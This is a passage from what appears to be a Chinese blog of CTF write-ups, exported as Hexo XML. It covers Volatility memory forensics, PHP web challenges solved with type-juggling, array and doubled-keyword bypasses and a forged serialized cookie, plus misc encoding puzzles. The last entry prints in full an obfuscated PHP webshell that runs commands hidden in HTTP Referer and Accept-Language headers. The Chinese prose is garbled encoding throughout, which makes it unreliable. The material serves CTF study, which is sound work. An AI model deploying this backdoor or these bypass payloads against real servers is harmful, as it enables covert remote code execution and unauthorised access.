8180</span><br></pre></td></tr></table></figure><blockquote><p>OFPPT-CTF{userinit.exe_8180}</p></blockquote><h4 id="Windows-memory-dump4"><a href="#Windows-memory-dump4" class="headerlink" title="Windows memory dump4"></a>Windows memory dump4</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/volatility]</span><br><span class="line">â””â”€<span class="comment"># python2 vol.py -f ../ctf/ofppt/physmemraw --profile=Win10x64_19041 dumpfiles --pid 8180 --dump-dir=../ctf/ofppt/                                    1 â¨¯</span></span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">ImageSectionObject 0xffff9a077f6d01a0   8180   \Device\HarddiskVolume2\Windows\SysWOW64\sechost.dll</span><br><span class="line">DataSectionObject 0xffff9a077f61f0d0   8180   \Device\HarddiskVolume2\Windows\System32\locale.nls</span><br><span class="line">ImageSectionObject 0xffff9a07857d4280   8180   \Device\HarddiskVolume2\Windows\Temp\userinit.exe</span><br><span class="line">ImageSectionObject 0xffff9a0784c4e590   8180   \Device\HarddiskVolume2\Windows\SysWOW64\cryptsp.dll</span><br><span class="line">ImageSectionObject 0xffff9a0784c6fa60   8180   \Device\HarddiskVolume2\Windows\System32\icuin.dll</span><br><span class="line">ImageSectionObject 0xffff9a0784c6f740   8180   \Device\HarddiskVolume2\Windows\System32\icuuc.dll</span><br><span class="line">DataSectionObject 0xffff9a0785d549b0   8180   \Device\HarddiskVolume2\Windows\System32\en-US\WWAHost.exe.mui</span><br><span class="line">DataSectionObject 0xffff9a0785d5ba30   8180   \Device\HarddiskVolume2\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_18.2106.12410.0_x64__8wekyb3d8bbwe\microsoft.system.package.metadata\S-1-5-21-1114333211-2247716564-2192578087-1001-MergedResources-0.pri</span><br><span class="line">DataSectionObject 0xffff9a077fefc730   8180   \Device\HarddiskVolume2\Windows\Globalization\Sorting\SortDefault.nls</span><br><span class="line">DataSectionObject 0xffff9a078480c5f0   8180   \Device\HarddiskVolume2\Windows\System32\en-US\edgehtml.dll.mui</span><br><span class="line">DataSectionObject 0xffff9a0780c1ced0   8180   \Device\HarddiskVolume2\Windows\ServiceProfiles\LocalService\AppData\Local\FontCache\~FontCache-System.dat</span><br><span class="line">DataSectionObject 0xffff9a0780d38620   8180   \Device\HarddiskVolume2\Windows\System32\en-US\KernelBase.dll.mui</span><br><span class="line">DataSectionObject 0xffff9a07809f4a30   8180   \Device\HarddiskVolume2\Windows\System32\en-US\dnsapi.dll.mui</span><br><span class="line">DataSectionObject 0xffff9a078482feb0   8180   \Device\HarddiskVolume2\Windows\ServiceProfiles\LocalService\AppData\Local\FontCache\~FontCache-S-1-5-21-1114333211-2247716564-2192578087-1001.dat</span><br></pre></td></tr></table></figure><p>ImageSectionObject 0xffff9a07857d4280   8180   \Device\HarddiskVolume2\Windows\Temp\userinit.exe</p><p>æœªå‡ºï¼Œå€Ÿä¸€ä¸‹å¤§å¸ˆå‚…çš„writeup</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ vol -f physmemraw windows.dumpfiles --pid 8180</span><br><span class="line"></span><br><span class="line">Volatility 3 Framework 2.0.2</span><br><span class="line">Progress:  100.00               PDB scanning finished  </span><br><span class="line">Cache   FileObject      FileName        Result</span><br><span class="line"></span><br><span class="line">ImageSectionObject      0x9a077f6d01a0  sechost.dll     file.0x9a077f6d01a0.0x9a077f0ddb20.ImageSectionObject.sechost.dll.img</span><br><span class="line">ImageSectionObject      0x9a07857d4280  userinit.exe    file.0x9a07857d4280.0x9a07843b6a90.ImageSectionObject.userinit.exe.img</span><br><span class="line">ImageSectionObject      0x9a0784c4e590  cryptsp.dll     file.0x9a0784c4e590.0x9a0784bbca20.ImageSectionObject.cryptsp.dll.img</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">â””â”€$ sha1sum file.0x9a07857d4280.0x9a07843b6a90.ImageSectionObject.userinit.exe.img</span><br><span class="line">962d96f30c8f126cbcdee6eecc5e50c3a408402b  file.0x9a07857d4280.0x9a07843b6a90.ImageSectionObject.userinit.exe.img</span><br></pre></td></tr></table></figure><p>Flag: <code>OFPPT-CTF&#123;962d96f30c8f126cbcdee6eecc5e50c3a408402b&#125;</code></p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hash&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;hash&#x27;</span>] === <span class="string">&quot;10932435112&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Not so easy mate.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$hash</span> = sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;hash&#x27;</span>]);</span><br><span class="line">    <span class="variable">$target</span> = sha1(<span class="number">10932435112</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$hash</span> == <span class="variable">$target</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;csictf&#123;loser&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"> ?hash=aaroZmOk</span><br></pre></td></tr></table></figure><blockquote><p>å‚è€ƒ<a href="https://hhyleung.github.io/writeups/ofppt-ctf-2022/">https://hhyleung.github.io/writeups/ofppt-ctf-2022/</a></p><blockquote><p>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> å–è¯ </tag>
            
            <tag> æµé‡åˆ†æ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022 RITSEC CTF éƒ¨åˆ†writeup</title>
      <link href="/2022/04/02/2022-RITSEC-CTF-%E9%83%A8%E5%88%86writeup/"/>
      <url>/2022/04/02/2022-RITSEC-CTF-%E9%83%A8%E5%88%86writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h3 id="Pretty-Horrible-Program-1"><a href="#Pretty-Horrible-Program-1" class="headerlink" title="Pretty Horrible Program 1"></a>Pretty Horrible Program 1</h3><p>è€ƒç‚¹ï¼šåŒå†™ç»•è¿‡preg_replace</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;bingus&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;bingus&#x27;</span>];</span><br><span class="line">    <span class="variable">$to_replace</span> = <span class="string">&#x27;bingus&#x27;</span>;</span><br><span class="line">    <span class="variable">$clean_string</span> = preg_replace(<span class="string">&quot;/<span class="subst">$to_replace</span>/&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$input</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Your string is: <span class="subst">$clean_string</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$clean_string</span> == <span class="variable">$to_replace</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;h2 class=\&quot;answer\&quot;&gt;Bingus &lt;span style=\&quot;color: green;\&quot;&gt;IS&lt;/span&gt; your beloved&lt;/h2&gt;&quot;</span>;</span><br><span class="line">      output_flag();</span><br></pre></td></tr></table></figure><p>$clean_string = preg_replace(â€œ/$to_replace/â€œ, â€˜â€™, $input);<br>å…³é”®ä»£ç ï¼Œgetä¼ å‚ä¸€ä¸ªbingusï¼Œç”±äºpreg_replaceä¼šæŠŠä¸€ä¸ªbingusæ›¿æ¢ä¸ºç©ºï¼Œä½†æ˜¯ä¸‹é¢åˆè¦ç­‰äºbingusï¼Œæˆ‘ä»¬å¯ä»¥åŒå†™<code>bingbingusus</code><br><img src="/images/2022-RITSEC-CTF/1.png" alt="image-20220402162035760"></p><h3 id="Pretty-Horrible-Program-3"><a href="#Pretty-Horrible-Program-3" class="headerlink" title="Pretty Horrible Program 3"></a>Pretty Horrible Program 3</h3><p>è€ƒç‚¹ï¼šhashå¼ºç¢°æ’</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;input1&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;input2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;input1&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;input2&#x27;</span>]) &#123;</span><br><span class="line">      <span class="keyword">print</span> <span class="string">&#x27;&lt;h3 class=&quot;error&quot;&gt;Nice try, but it won\&#x27;t be that easy ;)&lt;/h3&gt;&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (hash(<span class="string">&quot;sha256&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;input1&#x27;</span>]) === hash(<span class="string">&quot;sha256&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;input2&#x27;</span>])) &#123;</span><br><span class="line">      output_flag();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">print</span> <span class="string">&#x27;&lt;h3 class=&quot;error&quot;&gt;Your inputs don\&#x27;t match&lt;/h3&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬éœ€è¦è¾“å…¥input1å’Œinput2ï¼Œå¹¶ä¸”1ä¸2ä¸èƒ½ç›¸åŒï¼Œä½†æ˜¯ä»–ä»¬çš„sha256è¦ç›¸åŒå¯ä»¥è¿™æ ·ç»•è¿‡<br><code>input1[]=1&amp;input2[]=2</code></p><p><img src="/images/2022-RITSEC-CTF/2.png" alt="image-20220402164521180"></p><h3 id="Pretty-Horrible-Program-2"><a href="#Pretty-Horrible-Program-2" class="headerlink" title="Pretty Horrible Program 2"></a>Pretty Horrible Program 2</h3><p>è€ƒç‚¹ï¼šç®€å•phpååºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//public $role = &#x27;User&#x27;;</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$role</span>=<span class="string">&quot;Admin&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function is_admin()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//   if ($this-&gt;role == &#x27;Admin&#x27;) &#123;</span></span><br><span class="line">    <span class="comment">//     return true;</span></span><br><span class="line">    <span class="comment">//   &#125; else &#123;</span></span><br><span class="line">    <span class="comment">//     return false;</span></span><br><span class="line">    <span class="comment">//   &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function __sleep()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//   return array($this-&gt;role);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$c</span> = serialize(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;<span class="comment">//O:4:&quot;User&quot;:1:&#123;s:4:&quot;role&quot;;s:5:&quot;Admin&quot;;&#125;</span></span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œcookie çš„roleå¿…é¡»è¦æ˜¯admin,æ‰€ä»¥æˆ‘ä»¬æŠŠUseræ¢æˆadminï¼Œå…¶ä»–æ³¨é‡Šæ‰ï¼Œè¾“å‡ºå°±å¯ä»¥äº†<br>ç”±äºæˆ‘ä»¬è¿™é‡Œæ˜¯post å’Œ cookieæäº¤ ï¼Œè¦æ³¨æ„ç¼–ç é—®é¢˜ï¼Œæˆ‘ä»¬è¿™é‡Œç›´æ¥urlencodeï¼Œæäº¤å°±å¯ä»¥äº†</p><p><img src="/images/2022-RITSEC-CTF/3.png" alt="image-20220402181841597"></p><h4 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h4><blockquote><p>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> hashç¢°æ’ </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022hwsgogogo</title>
      <link href="/2022/01/26/2022hwsgogogo/"/>
      <url>/2022/01/26/2022hwsgogogo/</url>
      
        <content type="html"><![CDATA[<h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><h5 id="gogogo"><a href="#gogogo" class="headerlink" title="gogogo"></a>gogogo</h5><p>è€ƒç‚¹ï¼šæ‹¼å›¾+å–è¯+Aztec ç <br>ä¸‹è½½ä¸‹æ¥å‹ç¼©åŒ…æœ‰ä¸¤ä¸ªé™„ä»¶ï¼Œåˆ†åˆ«è§£å‹ä¸€ä¸‹ï¼Œä¸€ä¸ªæ˜¯æœ‰è®¸å¤šå›¾ç‰‡ï¼Œä¸€ä¸ªæ˜¯ä¸€ä¸ªrawæ–‡ä»¶ï¼Œæ˜¾ç„¶æ˜¯å–è¯äº†ã€‚<br>å…ˆçœ‹è¿™ä¸ªæœ‰è®¸å¤šå°å›¾ç‰‡çš„å‹ç¼©åŒ…ï¼Œæ˜¾ç„¶æ‹¼å›¾äº†ï¼Œæ€»å…±256å¼ å›¾ç‰‡ï¼Œæ˜¯16<em>16çš„å›¾ç‰‡ï¼Œæ˜¯160</em>100çš„å°å›¾ç‰‡<br><strong><img src="/images/hws2022/1.png" alt="image-20220126202221239"></strong><br>ç›´æ¥<code>montage *png -tile 16x16 -geometry 160x100+0+0 out.png</code>åˆæˆä¸€ä¸ªå¤§å›¾ç‰‡<br>è¿™è¾¹ç”¨gapsæ‹¼äº†å‡ æ¬¡æ²¡å‡ºï¼Œæœæ–­æŠŠout.pngæ”¹ä¸€ä¸‹å¤§å°ï¼Œå¤§å›¾å®¤ 2560<em>1600çš„ï¼Œæˆ‘ä»¬æ”¹æˆæ­£æ­£æ–¹å½¢ï¼Œ1600</em>1600<br><img src="/images/hws2022/2.png" alt="image-20220126202810888"><br><code>gaps --image=out2.png --generations=15 --population=256 --size=100 --verbose</code><br>åœ¨æ‹¼ä¸€ä¸‹å°±å‡ºæ¥äº†ï¼Œæ³¨æ„å‚æ•°<br><img src="/images/hws2022/3.png" alt="image-20220126203016856"><br>flagå…³é”®å­—æ²¡æœ‰ï¼Œæœä¸€ä¸ªzipï¼Œæ¡Œé¢ä¸Šæœ‰csgo.zip<br><code> python vol.py -f 2.raw --profile=WinXPSP2x86 filescan | grep flag</code><br><code> python vol.py -f 2.raw --profile=WinXPSP2x86 filescan | grep zip</code><br><img src="/images/hws2022/4.png" alt="image-20220126203415648"><br><code>python vol.py -f 2.raw --profile=WinXPSP2x86 dumpfiles -Q 0x0000000002182dc0 -D ./dasctf -u</code><br>æä¸€ä¸‹ï¼Œæœ‰å¯†ç ,ç”¨åˆšåˆšçš„å¯†ç è§£å‹ï¼Œé‡Œé¢æ˜¯ä¸¤ä¸ªå›¾ç‰‡ï¼Œç¬¬ä¸€ä¸ªå›¾ç‰‡å®¤csgoå›¾ç‰‡ï¼Œç¬¬äºŒä¸ªæ˜¯ä¸€ä¸ªç ä¸­é—´ç¼ºäº†å®šä½ç¬¦ï¼Œç”¨è°·æ­Œæœä¸€ä¸‹ï¼Œæ˜¯Aztecï¼Œåœ¨çº¿ç½‘ç«™<code>https://products.aspose.app/barcode/zh-hans/generate</code>ï¼Œå…ˆç”Ÿæˆä¸€ä¸ªaztecï¼ŒæŠŠä¸­é—´çš„å®šä½ç¬¦æ‰£ä¸‹æ¥ï¼Œç„¶åè´´ä¸Šå»ï¼Œæ‰«ç å°±å¯ä»¥äº†ã€‚<br><img src="/images/hws2022/5.png" alt="image-2022012620341548"><br><img src="/images/hws2022/6.png" alt="image-20220126204727776"></p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><blockquote><p>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
            <tag> hws2022 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>D.I.E&amp;Trinity CTFéƒ¨åˆ†wp</title>
      <link href="/2022/01/24/D-I-E-Trinity-CTF%E9%83%A8%E5%88%86wp/"/>
      <url>/2022/01/24/D-I-E-Trinity-CTF%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/tjuctf/index.png" alt="image-20220124192143500"><br>emmm å¤©æ´¥å¤§å­¦å’Œå—äº¬å¤§å­¦çš„æ‹›æ–°èµ›ï¼Œé¢˜ç›®è¿˜æ˜¯å¾ˆæœ‰è´¨é‡çš„ï¼Œtcläº†ï¼Œæœ‰äº›é¢˜è¿˜æ˜¯ä¸ä¼š<br>è®°ä¸€ä¸‹å§</p><h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><h5 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h5><p>ä¸‹è½½ä¸€ä¸ªé™„ä»¶ï¼Œfileçœ‹ä¸€ä¸‹ï¼Œå‘ç°æ˜¯dataï¼Œä¸ç®¡äº† ï¼Œç›´æ¥foremoståˆ†ç¦»ä¸€ä¸‹<br><code>foremost data</code><br>æœ‰ä¸¤ä¸ªå›¾ç‰‡ä¸€ä¸ªjpgï¼Œä¸€ä¸ªpngä¸¤ä¸ªå›¾ç‰‡æ˜¯ä¸€æ ·çš„ï¼Œç›²çŒœ<code>ç›²æ°´å°</code><br>é¡¹ç›®ä¸‹è½½<code>https://github.com/chishaxie/BlindWaterMark</code><br>ç›´æ¥<code>python3 bwmforpy3.py decode 00001537.png 00001404.jpg a.png</code><br><img src="/images/tjuctf/1.png" alt="image-20220124194256825">å‘ç°ï¼Œå›¾ç‰‡ä¸å¤ªæ¸…æ¥šï¼Œé—®äº†ä¸‹å‡ºé¢˜äººï¼Œæœ‰alphaå€¼ï¼Œç ”ç©¶ä¸€ä¸‹è„šæœ¬<br><img src="/images/tjuctf/2.png" alt="image-20220124194320886"><br>çœ‹åˆ° <code>--alpha &lt;float&gt;,  Manual setting alpha (default is 3.0)</code><br>é»˜è®¤å€¼ä¸ºä¸‰ï¼Œæˆ‘ä»¬è°ƒåˆ°5<code> python3 bwmforpy3.py decode 00001537.png 00001404.jpg a.png --alpha 5</code><br>è¿˜æ˜¯ä¸æ¸…æ¥šï¼ŒåŠ åˆ°10  <code>python3 bwmforpy3.py decode 00001537.png 00001404.jpg a.png --alpha 10</code><br><img src="/images/tjuctf/3.png" alt="image-20220124194614378"></p><h5 id="ezdecode"><a href="#ezdecode" class="headerlink" title="ezdecode"></a>ezdecode</h5><p>ç­¾åˆ°é¢˜ï¼Œæ˜¯å„ç§ç¼–ç çš„ç»„åˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ç¼–ç 1ï¼šYou Know That</span><br><span class="line">ZmxhZ3t3M2xjMG1f   --&gt;base64</span><br><span class="line">flag&#123;w3lc0m_7o_amaz1n9_CTF_vv0RId_!&#125;</span><br><span class="line">ç¼–ç 2ï¼šKey == 2</span><br><span class="line">7_mznoaa19    --&gt;æ …æ    keyä¸ºä¸º2</span><br><span class="line">ç¼–ç 3ï¼šPlay With Bubble</span><br><span class="line">xilog-fahig-kalal-kytef-begig-nanyh-zumal-tuxox   --&gt;æ°”æ³¡</span><br><span class="line">`http://www.hiencode.com/bubble.html`</span><br><span class="line">_CTF_vv0RId_!&#125;</span><br></pre></td></tr></table></figure><h5 id="è¿™é‡Œæœ‰åé—¨ï¼"><a href="#è¿™é‡Œæœ‰åé—¨ï¼" class="headerlink" title="è¿™é‡Œæœ‰åé—¨ï¼"></a>è¿™é‡Œæœ‰åé—¨ï¼</h5><p>ä¸ªäººè®¤ä¸ºè¿™ä¸ªé¢˜è¿˜æ˜¯éå¸¸æœ‰è¶£çš„ï¼Œé‡Œé¢æ¶‰åŠçš„åŠ å¯†æ–¹æ³•è¿˜æ²¡ææ‡‚ï¼Œå†™ä¸€ä¸‹åšé¢˜è®°å½•å§<br>æ‹¿åˆ°é™„ä»¶ï¼Œé¢˜ç›®å·²ç»è¯´äº†ï¼Œæ˜¯åé—¨ï¼Œçœ‹äº†ä¸€ä¸‹,æ˜¾ç„¶æ˜¯ç»è¿‡æ··æ·†åŠ å¯†çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$u</span>=<span class="string">&#x27;S+)$p.iS=$iSq[$m[2][$z]iS]iSiS;if(strpos(iS$p,$h)===0iS)&#123;$s[$iiS]=iS&quot;&quot;;$iSpiS=$ss($p,3);&#125;if(arriSiSay&#x27;</span>;</span><br><span class="line"><span class="variable">$H</span>=<span class="string">&#x27;s=&amp;iS$_SESSiSION;$ss=&quot;subsiSiStr&quot;;$sliS=&quot;stiSrtolower&quot;;$i=$miS[1][iS0].iS$m[iS1][iS1];$h=$sl($ss(md5iS&#x27;</span>;</span><br><span class="line"><span class="variable">$X</span>=<span class="string">&#x27;($i.iS$kh),0,iS3)iS);$f=$sl(iS$ssiS(iSmd5($i.$kf),iS0iS,iS3));$p=&quot;&quot;;foriS($z=1;$z&lt;couiSiSnt($m[1]);$z+i&#x27;</span>;</span><br><span class="line"><span class="variable">$L</span>=str_replace(<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;crexxatex_fxxunxction&#x27;</span>);</span><br><span class="line"><span class="variable">$E</span>=<span class="string">&#x27;;$i&lt;$l;)&#123;foriS($j=0;(iS$j&lt;$ciS&amp;&amp;iS$i&lt;$l);$jiSiS++,iS$i++)&#123;$o.=$t&#123;$iiS&#125;^$k&#123;$j&#125;iS;iS&#125;iS&#125;riSeturn $o;&#125;$iSr=iSiS$&#x27;</span>;</span><br><span class="line"><span class="variable">$Q</span>=<span class="string">&#x27;=basiSiSe64_encode(x(giSzcompress($o)iS,$k)iS);print(&quot;iS&lt;$k&gt;iS$d&lt;/iS$k&gt;&quot;);@siSessioniS_destroyiS();&#125;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$p</span>=<span class="string">&#x27;_SiSERViSEiSR;iS$rr=@$r[&quot;HTTiSP_REFEiSRER&quot;iS];$ra=@$r[iS&quot;iSHTTP_ACCEiSPT_LANGiSUAGE&quot;]iS;ifiS($rr&amp;&amp;$iSra)&#123;$&#x27;</span>;</span><br><span class="line"><span class="variable">$l</span>=<span class="string">&#x27;iS$kiSh=&quot;3481&quot;iS;iS$kf=&quot;iS9diS7b&quot;;funiSctiSion x($t,$k)&#123;$c=strliSen($kiS);iSiS$l=strlen($tiS);$o=&quot;&quot;;foiSr(iS$i=0iS&#x27;</span>;</span><br><span class="line"><span class="variable">$h</span>=<span class="string">&#x27;ll(iS&quot;/([\\w])iS[\\w-]+(iS?:;q=0.iS([iSiS\\d]))?,?/&quot;,iS$riSa,iS$miS);if($q&amp;&amp;$m)&#123;@siSession_staiSrtiS(iS);$&#x27;</span>;</span><br><span class="line"><span class="variable">$Z</span>=<span class="string">&#x27;art();@evaiSl(@giSzuniSiSciSompress(@x(@baseiS64_decodeiS(pregiS_riSeplace(ariSray(&quot;/_/&quot;,&quot;/-/iS&quot;),arriSa&#x27;</span>;</span><br><span class="line"><span class="variable">$W</span>=<span class="string">&#x27;_key_exiSists(iS$i,$s))&#123;iS$siS[$i].=$piS;$e=iSiSstrpos($siS[$iiS]iS,$f);if($e)&#123;$k=$kh.$kiSf;ob_stiSiS&#x27;</span>;</span><br><span class="line"><span class="variable">$g</span>=<span class="string">&#x27;u=paiSrse_iSiSurl($rr);pariSse_siStr($u[&quot;queriSy&quot;],$iSq)iS;iSiS$q=array_iSvaluiSes($q);pregiS_match_a&#x27;</span>;</span><br><span class="line"><span class="variable">$D</span>=<span class="string">&#x27;y(iS&quot;/&quot;,iS&quot;iS+&quot;)iS,$ss($s[$i],iS0,$e)iS)),$k)))iS;$o=obiS_get_iSiScontents()iS;ob_eniSd_iScleaiSn();$d&#x27;</span>;</span><br><span class="line"><span class="variable">$O</span>=str_replace(<span class="string">&#x27;iS&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$l</span>.<span class="variable">$E</span>.<span class="variable">$p</span>.<span class="variable">$g</span>.<span class="variable">$h</span>.<span class="variable">$H</span>.<span class="variable">$X</span>.<span class="variable">$u</span>.<span class="variable">$W</span>.<span class="variable">$Z</span>.<span class="variable">$D</span>.<span class="variable">$Q</span>);</span><br><span class="line"><span class="variable">$q</span>=<span class="variable">$L</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$O</span>);<span class="variable">$q</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>googleä¸€ä¸‹å…³é”®ä»£ç 